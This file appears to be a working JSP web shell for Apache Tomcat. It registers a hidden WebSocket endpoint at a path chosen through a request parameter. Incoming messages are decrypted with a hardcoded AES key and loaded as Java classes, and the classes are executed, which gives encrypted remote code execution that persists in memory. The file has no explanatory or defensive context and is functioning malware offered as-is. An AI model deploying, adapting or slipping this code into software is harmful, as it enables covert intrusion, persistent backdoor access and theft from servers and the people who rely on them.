<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.nio.ByteBuffer" %>
<%!
    public static class X extends ClassLoader{ public X(ClassLoader z){super(z);}
        public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);}
    }
    public static byte[] x(byte[] s, boolean m){
        String xc="3c6e0b8a9c15224a";
        try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
            return c.doFinal(s); }catch (Exception e){ e.printStackTrace();return null; }}

    public static class cmdEndpoint extends Endpoint {
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            session.addMessageHandler(new MessageHandler.Whole<ByteBuffer>() {
                @Override
                public void onMessage(ByteBuffer databf) {
                    try {
                        byte[] data= databf.array();
                        data = x(data, false);
                        if (session.getUserProperties().get("payload")==null){
                            session.getUserProperties().put("payload", new X(this.getClass().getClassLoader()).Q(data));
                            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x("ok".getBytes(), true)));
                        }else{
                            session.getUserProperties().put("parameters", data);
                            Object f=((Class)session.getUserProperties().get("payload")).newInstance();
                            java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
                            f.equals(arrOut);
                            f.equals(session);
                            f.equals(data);
                            f.toString();
                            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(arrOut.toByteArray(), true)));
                        }
                    } catch (Exception e) { }
                }
            });
        }
    }

%><%
    String path = request.getParameter("path");
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(cmdEndpoint.class, path).build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    configEndpoint.getUserProperties().put("servletRequest", request);
    configEndpoint.getUserProperties().put("servletContext", request.getServletContext());
    configEndpoint.getUserProperties().put("httpSession", request.getSession());
    container.setDefaultMaxTextMessageBufferSize(52428800);
    container.setDefaultMaxBinaryMessageBufferSize(52428800);
    try {
        if (null == container.findMapping(path)) {
            container.addEndpoint(configEndpoint);
        }
    } catch (DeploymentException e) {
        out.println(e.toString());
    }
%>